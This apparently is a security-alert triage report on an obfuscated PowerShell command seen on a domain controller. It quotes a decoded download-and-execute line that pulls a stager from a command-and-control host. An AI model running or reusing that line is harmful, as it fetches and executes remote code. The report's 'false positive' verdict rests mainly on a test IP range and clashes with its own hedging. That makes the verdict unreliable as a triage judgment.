## Investigation Summary

### Alert Classification and Severity Assessment
- **Alert Type:** High severity PowerShell-based defense evasion attack
- **Risk Score:** 87/100
- **MITRE ATT&CK Techniques:** T1059.001 (PowerShell), T1027 (Obfuscated Files)
- **Target:** Domain Controller (DC01.corp.widgets-inc.com)

### Decoded PowerShell Command Analysis
The base64 encoded command decodes to:
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://c2-relay.darkops.net/stager.ps1')
```
This is a classic malware dropper pattern attempting to download and execute a remote PowerShell script.

### Overall Verdict: **FALSE POSITIVE / TEST SCENARIO**

**Reasoning:**
1. The destination IP (198.51.100.99) is a reserved test IP that should never appear in production traffic
2. While the domain and URL patterns are highly suspicious and match real attack techniques, the use of a test IP suggests this is a simulated attack or security exercise
3. The PowerShell binary itself is legitimate and properly signed by Microsoft

### Recommended Next Steps

1. **Immediate Actions:**
   - Verify this is a planned security exercise or penetration test
   - If not planned, treat as a potential live attack despite the test IP
   - Check network logs for any actual outbound connections to the suspicious domain

2. **Investigation Steps:**
   - Interview system administrators about planned security testing
   - Review security awareness training schedules
   - Examine process tree and parent processes for additional context
   - Check for persistence mechanisms on DC01

3. **Preventive Measures:**
   - Implement PowerShell logging and monitoring
   - Consider PowerShell execution policy restrictions
   - Block suspicious domains at DNS/proxy level
   - Monitor for encoded PowerShell commands

4. **Follow-up:**
   - If confirmed as a test, document the exercise and update detection rules
   - If real attack, initiate full incident response procedures
   - Review domain controller security hardening

**Note:** The combination of sophisticated attack techniques with a test IP address strongly suggests this is a controlled security exercise rather than a genuine threat.
